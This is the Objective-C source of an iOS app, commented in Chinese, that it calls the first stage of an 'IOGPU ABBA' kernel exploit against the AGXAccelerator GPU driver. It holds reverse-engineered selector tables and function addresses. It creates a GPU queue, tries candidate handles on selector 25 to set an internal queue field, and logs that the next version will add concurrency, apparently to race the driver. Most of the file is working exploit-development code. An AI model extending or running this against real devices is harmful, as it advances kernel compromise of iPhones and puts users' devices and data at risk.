//
//  agxsq.m — IOGPU ABBA 第一阶段：让队列的 +0x428 非零
//
//  离线已确认（表 A @0x7dc1680，56 项 × 24B）：
//    idx 7  fn=0x9bf3b9c  cin=0 sin=0x408    sout=0x10   建队列（真机已验证 in=1032 -> id=1）
//    idx 25 fn=0x9bf4244  cin=2 sin=0        sout=0      reset(id, handle) -> 设置 queue+0x428
//    idx 26 fn=0x9bf430c  cin=4 sin=0xffffffff sout=0     提交（走 B 路径）
//
//  sel 25 内部：
//    scalar[0] = queue id -> 0x9c0fa04 get_queue_by_id
//    scalar[1] = handle   -> 0x9c0fa10 get_obj(device, handle)
//    两者都非零才调 0x9c1dc90(queue, obj)
//  0x9c1dc90 里：
//    lock(458) -> 检查 [[queue+0x430]] == 0 -> 是则 queue+0x428 = 0x9bfa5bc(obj)
//    返回 0 表示设置成功；返回 0xe00002c9 表示"已存在，跳过"（打 attempted to reset notification queue）
//
//  本包只做第一阶段：找到能让 sel 25 返回 0 的 scalar[1]。
//  不提交、不并发、不会 panic。
//

#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <unistd.h>

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static const char *kr_name(kern_return_t kr)
{
    switch ((uint32_t)kr) {
        case 0:          return "SUCCESS";
        case 0xe00002b0: return "NoSuchClass";
        case 0xe00002bc: return "Error";
        case 0xe00002bd: return "?0x2bd";
        case 0xe00002be: return "NoResources";
        case 0xe00002c0: return "NoDevice";
        case 0xe00002c1: return "NotPrivileged";
        case 0xe00002c2: return "BadArgument";
        case 0xe00002c5: return "ExclusiveAccess";
        case 0xe00002c7: return "Unsupported";
        case 0xe00002c9: return "InternalError";
        case 0xe00002cc: return "NotOpen";
        case 0xe00002d4: return "Busy";
        case 0xe00002d8: return "NotAttached";
        case 0xe00002e2: return "NotPermitted";
        case 0xe00002f0: return "NotFound";
        default:         return "?";
    }
}

static void L(const char *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    char buf[1024];
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    NSString *s = [NSString stringWithUTF8String:buf];
    if (!s) return;
    NSLog(@"AGXSQ %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:@"agxsq.log"];
    FILE *f = fopen([p UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    dispatch_sync(dispatch_get_main_queue(), ^{
        [gLog appendString:line];
        if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) {
            gStatus.text = s;
            gStatus.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightBold];
        }
    });
}

// 建队列：sin=0x408, sout=0x10
static uint32_t g_qid = 0;

static BOOL create_queue(io_connect_t conn)
{
    uint8_t in[0x408];
    memset(in, 0, sizeof(in));
    uint8_t out[0x10];
    size_t os = sizeof(out);
    memset(out, 0, sizeof(out));

    kern_return_t kr = IOConnectCallStructMethod(conn, 7, in, sizeof(in), out, &os);
    uint32_t v0 = 0, v1 = 0;
    if (os >= 8) { v0 = *(uint32_t*)out; v1 = *(uint32_t*)(out+4); }
    L("  sel 7 (建队列, in=0x408) -> 0x%08x %-14s outSize=0x%zx  v0=%u v1=0x%08x",
      (uint32_t)kr, kr_name(kr), os, v0, v1);
    if (kr == KERN_SUCCESS) {
        g_qid = v0 ? v0 : 1;
        L("      队列 id = %u", g_qid);
        return YES;
    }
    return NO;
}

// sel 25：scalar[0]=qid, scalar[1]=handle
static void try_reset(io_connect_t conn, uint32_t handle, const char *label)
{
    uint64_t in[2] = { g_qid, handle };
    uint64_t out[4]; memset(out, 0, sizeof(out));
    uint32_t oc = 4;

    kern_return_t kr = IOConnectCallScalarMethod(conn, 25, in, 2, out, &oc);
    L("  sel 25 handle=0x%08x (%-10s) -> 0x%08x %-14s outCnt=%u",
      handle, label, (uint32_t)kr, kr_name(kr), oc);
    usleep(120 * 1000);
}

// sel 26：scalars=[qid, ?, count, stride]，structIn = count*stride
static void try_submit(io_connect_t conn, uint32_t a0, uint32_t a1, uint32_t count, uint32_t stride)
{
    uint64_t sc[4] = { a0, a1, count, stride };
    size_t sz = (size_t)count * stride;
    if (sz == 0 || sz > 0x1000) { L("  sel 26 参数非法跳过"); return; }
    uint8_t *in = calloc(sz, 1);
    if (!in) return;

    kern_return_t kr = IOConnectCallStructMethod(conn, 26, in, sz, NULL, NULL);
    L("  sel 26 [%u,%u,%u,0x%x] in=%zu -> 0x%08x %s",
      a0, a1, count, stride, sz, (uint32_t)kr, kr_name(kr));
    free(in);
    usleep(120 * 1000);
}

static void run(void)
{
    L("===== IOGPU ABBA 第一阶段：让 queue+0x428 非零 =====");
    L("uid=%d pid=%d", getuid(), getpid());
    L("");

    CFMutableDictionaryRef m = IOServiceMatching("AGXAcceleratorG13P_B0");
    io_service_t svc = m ? IOServiceGetMatchingService(kIOMainPortDefault, m) : MACH_PORT_NULL;
    L("[1] AGXAcceleratorG13P_B0 = 0x%x", svc);
    if (svc == MACH_PORT_NULL) { L("  未匹配"); SetStatus(@"未匹配"); return; }

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
    L("[2] open(type=1) -> 0x%08x %s conn=0x%x", (uint32_t)kr, kr_name(kr), conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) { L("  t1 打不开"); SetStatus(@"打不开"); return; }

    L("");
    L("=== 阶段 A：建队列 ===");
    if (!create_queue(conn)) {
        L("  建队列失败，中止");
        IOServiceClose(conn); SetStatus(@"建队列失败"); return;
    }

    L("");
    L("=== 阶段 B：sel 25 逐 handle 试（找能返回 SUCCESS 的）===");
    // 候选 handle：0 / 1 / qid / sel7 输出的 v1 / 常见 id
    uint32_t handles[] = { 0, 1, g_qid, 2, 0x100, 0x1000, 0xffffffff,
                           0x160fc25b, 0x00000001, 0x00000010 };
    const char *labels[] = { "zero", "one", "qid", "two", "0x100", "0x1000", "0xffffffff",
                             "sel7v1", "one2", "0x10" };
    int n = sizeof(handles)/sizeof(handles[0]);
    for (int i = 0; i < n; i++) {
        SetStatus([NSString stringWithFormat:@"sel25 try %d", i]);
        try_reset(conn, handles[i], labels[i]);
    }

    L("");
    L("=== 阶段 C：sel 26 现在是否还会早退（看返回码变化）===");
    // 用户已验证 stride=0x38 命中
    try_submit(conn, g_qid, 0, 1, 0x38);

    L("");
    L("=== 判读 ===");
    L("  · sel 25 返回 0x00000000  -> ★ queue+0x428 已设置，下一版直接并发");
    L("  · sel 25 返回 0xe00002c9  -> +0x428 已存在但被跳过（InternalError + 日志）");
    L("  · sel 25 返回 0xe0000xxx 其他 -> handle 不对，换下一批候选");
    L("  · sel 26 若从 0xe00002bc 变成别的码 -> 说明循环入口变了");
    SetStatus(@"完成，看日志");
    IOServiceClose(conn);
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("agxsq.log", DISPATCH_QUEUE_SERIAL);

    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 52, self.window.bounds.size.width - 16, 30)];
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"agxsq...";
    gStatus.textColor = [UIColor colorWithRed:0.3 green:1 blue:0.3 alpha:1];
    gStatus.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];

    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 84, self.window.bounds.size.width, h - 84)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:9] ?: [UIFont systemFontOfSize:9];
    gView.editable = NO;
    [vc.view addSubview:gView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
